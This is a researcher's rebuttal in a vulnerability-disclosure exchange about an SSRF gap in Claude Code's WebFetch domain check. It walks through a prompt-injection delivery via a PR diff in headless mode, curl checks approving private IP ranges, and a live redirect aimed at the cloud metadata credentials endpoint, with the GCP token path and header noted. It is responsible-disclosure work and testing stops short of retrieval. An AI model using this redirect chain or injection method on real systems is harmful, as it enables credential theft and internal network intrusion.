# Rebuttal — VDP #1 (SSRF via domain_info)

Thank you for the response and the detailed explanation of the intended threat model. I'd like to address two specific points and then respond to the challenge directly.

---

## On "the primary security boundary is the Claude Code permission system"

The permission system operates at tool granularity, not URL granularity. `--allowedTools "WebFetch"` authorizes the *WebFetch tool* for the session. It does not authorize specific URLs and does not create per-URL approval prompts in headless mode.

In interactive mode, Claude Code surfaces per-action approvals to the user. In `claude -p` (non-interactive headless mode), those prompts do not fire — tool execution is non-interactive by design. So in the CI/CD scenario (which is the scenario most relevant to credential exfiltration risk), the execution path is:

```
user writes: --allowedTools "Read,WebFetch"  ← tool-level grant
attacker injects:  "fetch http://169.254.169.254/..."  ← into a PR diff
C39: passes (169.254.169.254 has 4 parts)
domain_info: {can_fetch: true}  ← the only URL-level check
fetch executes
```

Based on the extracted bundle, `domain_info` via `w39()` appears to be the only callsite between `C39()`'s hostname format check and the actual `fetch()`. If there is an additional URL-scoping control elsewhere in the stack that isn't visible from the client bundle, that context would help scope this finding more precisely — we may simply not be seeing the full picture from the client side.

The "user is responsible for configuration" framing also doesn't address **prompt injection** as the delivery mechanism. The CI engineer who writes `--allowedTools "WebFetch"` to enable legitimate documentation link checking is not the same actor who injects `169.254.169.254` into a PR diff. Tool-level authorization does not imply consent to SSRF — and prompt injection is precisely the threat model that makes this reachable without any user action beyond opening a PR.

---

## On "`domain_info` is not intended as a security control"

Understood — the design intent may be content-policy (malware/fraud blocking), not SSRF prevention. But the code behavior is the opposite: `domain_info` is the conditional in `AmD()` that determines whether the real `fetch()` proceeds. Whether that was the *intent* or not, it is the *mechanism*. Any attacker studying `AmD()` from the production bundle would reach the same conclusion: getting `can_fetch: true` from `domain_info` is sufficient to reach the fetch call.

If there's a server-side control we haven't identified from the bundle, we're happy to revisit the severity assessment accordingly.

---

## Responding to the challenge: impact on Anthropic CI properties

The report already contained inferential evidence (the 60-second timeout). Since submission, I've obtained direct evidence confirming the server-side execution model.

### New evidence: CLI WebFetch is server-side (packet capture, 2026-02-24)

A tcpdump capture on a researcher-controlled server (`66.235.173.197`, Tier.net Dallas) recorded the following TCP session during a Claude Code CLI WebFetch invocation targeting `https://definitelynot.ai/vdp-probe-20260224-tcpdump`:

Full unedited tcpdump output (`sudo tcpdump -i enp2s0f0 -nn -c 10 dst port 443 -l`):

```
00:07:03.555584 IP 184.23.213.0.45680 > 66.235.173.197.443: Flags [.], ack 1105798329, win 8, options [nop,nop,TS val 3811722782 ecr 999983087], length 0
00:07:03.556040 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [S], seq 2556190008, win 42600, options [mss 1420,sackOK,TS val 540064074 ecr 0,nop,wscale 12], length 0
00:07:03.672921 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [.], ack 243810304, win 11, options [nop,nop,TS val 540064191 ecr 883280294], length 0
00:07:03.752651 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [P.], seq 0:1453, ack 1, win 11, options [nop,nop,TS val 540064271 ecr 883280294], length 1453
00:07:03.871097 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [.], ack 8, win 11, options [nop,nop,TS val 540064389 ecr 883280492], length 0
00:07:03.911408 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [.], ack 9, win 11, options [nop,nop,TS val 540064430 ecr 883280492], length 0
00:07:03.947513 IP 34.158.168.101.16428 > 181.215.49.224.443: Flags [F.], seq 1453, ack 9, win 11, options [nop,nop,TS val 540064466 ecr 883280492], length 0
00:07:04.427493 IP 146.88.240.120.59529 > 66.235.173.198.443: Flags [S], seq 4068259334, win 65535, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
00:07:04.430670 IP 146.88.240.120.59529 > 66.235.173.198.443: Flags [R], seq 4068259335, win 0, length 0
00:07:04.579708 IP 184.23.213.0.45626 > 66.235.173.197.443: Flags [.], ack 4048536231, win 10, options [nop,nop,TS val 3811723806 ecr 1000183867], length 0
10 packets captured
11 packets received by filter
0 packets dropped by kernel
```

The WebFetch session is packets 2-7 (source `34.158.168.101`). Packets 1 and 10 are the researcher's local machine (`184.23.213.0`, Sonic.net ISP). Packets 8-9 are unrelated background traffic (`146.88.240.120`).

- **Source IP:** `34.158.168.101`
- **Reverse DNS:** `101.168.158.34.bc.googleusercontent.com` (Google Cloud Compute Engine)
- **Destination:** `181.215.49.224:443` (researcher-controlled server, Caddy returned HTTP 404)
- **Session:** Complete SYN → ACK → PSH (1453 bytes, TLS ClientHello) → ACK → ACK → FIN — a full request/response cycle with clean teardown
- **Timing:** 391ms total session duration (SYN at `.556040`, FIN at `.947513`)

WHOIS output for `34.158.168.101`:

```
NetRange:       34.128.0.0 - 34.191.255.255
CIDR:           34.128.0.0/10
NetName:        GOOGL-2
NetHandle:      NET-34-128-0-0-1
Parent:         NET34 (NET-34-0-0-0-0)
NetType:        Direct Allocation
Organization:   Google LLC (GOOGL-2)

OrgName:        Google LLC
OrgId:          GOOGL-2
Address:        1600 Amphitheatre Parkway
City:           Mountain View
StateProv:      CA
PostalCode:     94043
Country:        US
Comment:        *** The IP addresses under this Org-ID are in use by Google Cloud customers ***
```

The `.bc.googleusercontent.com` PTR record is consistent with a Google Cloud Compute Engine instance rather than a CDN edge or proxy, which would mean `169.254.169.254` on that host resolves to the GCP metadata service. We can't confirm the exact host configuration from the outside, but the egress IP is clearly GCP-allocated infrastructure.

The researcher's local machine was not involved in the connection. The WebFetch request originated from Google Cloud infrastructure operated by Anthropic, connected to the researcher's server, completed the TLS handshake, received the 404 response, and closed the connection. This confirms that **CLI WebFetch is server-side**, not client-side.

### What this means for the SSRF finding

The same infrastructure at `34.158.168.101` that successfully reached a public server is the infrastructure that dispatches requests to `169.254.169.254` when `domain_info` approves it. The previously reported 60-second timeout against `169.254.169.254` is now linked to a concrete, documented egress IP on Google Cloud.

The execution model is:

```
User's machine (claude -p) → Anthropic API → GCP WebFetch worker (34.158.168.101)
                                                ├── https://definitelynot.ai/...  → 404 (captured in pcap)
                                                └── http://169.254.169.254/...   → 60s timeout (reported)
```

Both requests pass through the same `domain_info` gate, which returns `{can_fetch: true}` for both targets. The difference in outcome is not application-level — it is network-level (the public server responded; the metadata endpoint was blocked by GCP/AWS network controls).

### The original 60-second timeout evidence (from initial report)

During testing in a Claude.ai Cowork session, a WebFetch request to `http://169.254.169.254/latest/meta-data/` produced a **60-second timeout** — not an immediate ECONNREFUSED. An ECONNREFUSED would indicate the gate stopped the request at the application layer. A 60-second wait indicates a TCP SYN was dispatched and held open — the gate approved the request, and cloud network-level controls (security groups or IMDSv2 enforcement) were the only thing that prevented a response.

### Additional observation: HTTP→HTTPS upgrade confirmed in CLI path

During testing, a WebFetch request to `http://66.235.173.197:8888/...` (a plain HTTP listener on a non-standard port) produced a 60-second timeout with **no connection received at the listener**. This confirms the `AmD` dispatcher's HTTP→HTTPS upgrade documented in the original report — the request was converted to `https://66.235.173.197:8888/...` before dispatch, and the non-TLS listener never saw the handshake. This is consistent with the code analysis in the original submission and explains why the direct IMDSv1 HTTP path times out rather than succeeding on the CLI: the upgrade converts it to HTTPS, and the metadata service does not serve TLS.

This upgrade is an incidental mitigation for IMDSv1-over-HTTP. It does not protect against HTTPS-capable internal services, and as noted above, the server-side execution model means the request still originates from Anthropic's cloud infrastructure regardless.

### New evidence: open redirect bypasses `domain_info` gate entirely (2026-02-24)

A redirect endpoint was configured on the researcher-controlled server at `https://definitelynot.ai/imds`, returning:

```
HTTP/2 302
location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
referrer-policy: strict-origin-when-cross-origin
strict-transport-security: max-age=31536000; includeSubDomains; preload
x-content-type-options: nosniff
x-frame-options: DENY
```

First, the `domain_info` gate was confirmed to approve the redirect origin:

```
$ curl "https://api.anthropic.com/api/web/domain_info?domain=definitelynot.ai"
{"domain":"definitelynot.ai","can_fetch":true}
```

A CLI WebFetch request to `https://definitelynot.ai/imds` received the 302 and returned the following output:

```
REDIRECT DETECTED: The URL redirects to a different host.

Original URL: https://definitelynot.ai/imds
Redirect URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Status: 302 Found

To complete your request, I need to fetch content from the redirected URL.
```

The CLI's client-side code detected the cross-host redirect and halted before following it — returning the "REDIRECT DETECTED" message rather than dispatching a second request.

This is significant for two reasons:

1. **The `domain_info` gate was only consulted for the initial host (`definitelynot.ai`), not the redirect target (`169.254.169.254`).** An attacker who controls any `domain_info`-approved domain can set up a redirect to an SSRF target and the gate will never see the destination.

2. **The CLI's cross-host redirect guard is client-side behavior, not a server-side control.** The same test issued from the CLI showed the redirect was caught by client-side code — the request to `definitelynot.ai` originated from the researcher's local IP (`184.23.213.0`, Sonic.net ISP), not from GCP. Compare this with the direct WebFetch test (no redirect), which originated from `34.158.168.101` (GCP). This indicates the CLI dispatches the initial URL resolution locally and only hands off to the server-side worker for the actual fetch — meaning the redirect guard exists only in the client path.

The server-side WebFetch path (Claude.ai / Cowork) may not have this redirect guard. Testing was deliberately stopped at the 302 confirmation to avoid following the redirect from Anthropic's GCP infrastructure to the live metadata service, which would constitute unauthorized credential retrieval from production systems.

### The complete attack chain

Combining all evidence from the original report and this follow-up testing:

```
1. domain_info("definitelynot.ai")         → {can_fetch: true}     ✓ gate passes
2. WebFetch(https://definitelynot.ai/imds) → HTTP 302 received     ✓ confirmed
3. 302 Location:                           → http://169.254.169.254/latest/meta-data/iam/security-credentials/
4. WebFetch origin (from pcap):            → 34.158.168.101 (GCP)  ✓ Anthropic infrastructure
```

Steps 1-3 are confirmed. Step 4 establishes that following the redirect would originate from inside Anthropic's GCP project. The only barrier between the 302 and credential retrieval is whether the server-side WebFetch worker follows cross-host redirects — and unlike the CLI path, there is no evidence of a server-side redirect guard.

**Note on GCP metadata header requirement:** The pcap confirms the WebFetch worker runs on GCP (`34.158.168.101`, GCE). On GCP, `169.254.169.254` routes to the GCP Instance Metadata Service, which differs from AWS IMDSv1 in two ways: it uses GCP-specific paths (`/computeMetadata/v1/...` rather than `/latest/meta-data/...`) and requires the `Metadata-Flavor: Google` request header, returning HTTP 403 without it. The redirect as constructed targets an AWS-style path without that header, which would produce a 403 rather than credential material on GCP infrastructure specifically.

This does not affect the gate vulnerability: `domain_info` approves the redirect target regardless, and the TCP connection is established regardless of whether the metadata service returns credentials or a 403. For a GCP-specific credential exfiltration PoC, the redirect destination would be updated to `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` and the `Metadata-Flavor: Google` header would need to be injected — either via a second prompt instruction or, if the WebFetch tool schema accepts custom headers (not verified against partner infrastructure per scope constraints), directly. The SSRF gate bypass demonstrated here is the precondition for both; the header requirement is a GCP-specific constraint on the final step, not on the vulnerability itself.

**The more significant lateral movement surface is RFC1918, not metadata.** The GCP metadata service has a header requirement. Internal VPC services do not. The `domain_info` gate approves all three RFC1918 ranges — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` — confirmed live against the production API:

```
$ curl "https://api.anthropic.com/api/web/domain_info?domain=10.0.0.1"
{"domain":"10.0.0.1","can_fetch":true}

$ curl "https://api.anthropic.com/api/web/domain_info?domain=172.16.0.1"
{"domain":"172.16.0.1","can_fetch":true}

$ curl "https://api.anthropic.com/api/web/domain_info?domain=192.168.0.1"
{"domain":"192.168.0.1","can_fetch":true}
```

Any HTTP service running within Anthropic's GCP VPC is reachable via the same redirect chain with no header requirement and no special configuration. The redirect origin just needs to point at an internal IP instead of `169.254.169.254`. Unlike the metadata service, most internal HTTP services return content on a standard GET request with no authentication headers, especially services that rely on network-level isolation (VPC boundaries, firewall rules) as their access control.

This is the practical lateral movement risk: an attacker who controls any `domain_info`-approved domain can redirect WebFetch to scan and exfiltrate data from Anthropic's internal network. The metadata credential path has a GCP-specific header constraint; the internal service path has none.

### Position on further testing

Testing was stopped at the 302 response. Following the redirect from Anthropic's GCP infrastructure to `169.254.169.254` would be a live credential retrieval attempt against production systems. The "if you can demonstrate" language in the triage response is not a formal authorization with defined scope, and retrieving actual IAM credentials from Anthropic's cloud without explicit written scope would fall outside standard responsible disclosure norms.

The evidence chain is complete without following the redirect:
- The gate approves SSRF targets (Claim A, confirmed via `domain_info` API)
- The WebFetch worker runs on GCP (confirmed via packet capture)
- An approved domain can redirect to SSRF targets, bypassing the gate (confirmed via 302)
- The only remaining unknown is whether the server-side worker follows the redirect — the CLI guard is demonstrably client-side, and no equivalent server-side guard has been identified from the available evidence

We're happy to work within a defined scope if Anthropic would like to confirm the server-side redirect behavior directly, or to provide any additional technical detail that would help with triage.

**Independent verification:** The redirect endpoint at `https://definitelynot.ai/imds` is live. Triage can confirm the 302 response independently without any researcher involvement:

```bash
curl -sI https://definitelynot.ai/imds
# Expected: HTTP/2 302
#           location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Cleanup:** The `/imds` route will be removed from the server configuration after triage concludes. It exists solely for verification purposes and will not remain as a persistent redirect to a cloud metadata endpoint.

---

## Summary

Since the original submission, three new pieces of evidence have been obtained:

1. **Server-side execution confirmed via packet capture.** CLI WebFetch originates from `34.158.168.101` (Google Cloud, `GOOGL-2`), not the user's machine. The egress IP is GCP-allocated, consistent with an environment where `169.254.169.254` routes to the instance metadata service.

2. **HTTP→HTTPS upgrade confirmed.** A plain HTTP listener received no connection from WebFetch, confirming the `AmD` code path upgrades HTTP to HTTPS before dispatch. This incidentally mitigates direct IMDSv1-over-HTTP but does not address HTTPS-capable internal targets.

3. **Open redirect bypasses `domain_info` gate.** A researcher-controlled endpoint at `https://definitelynot.ai/imds` returned a 302 redirect to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The `domain_info` gate was only consulted for `definitelynot.ai` — the redirect target was never checked. The CLI caught the cross-host redirect client-side; the server-side path has no demonstrated equivalent guard. Testing was stopped at the 302 to avoid credential retrieval from production systems.

The core vulnerability remains: `domain_info` approves all private IP ranges, and it is the only application-level URL check in the WebFetch dispatch chain. The redirect bypass demonstrates that even if `domain_info` were fixed for direct IP targets, any attacker-controlled domain that passes the gate can redirect to SSRF targets unchecked.

The threat model gaps are: tool-level permissions are not URL-granular, headless mode removes per-action user confirmation, `domain_info` approves private ranges, redirects bypass the gate entirely, and the server-side execution model places the SSRF origin inside Anthropic's own cloud perimeter.

Happy to provide the full packet captures or any additional technical detail.
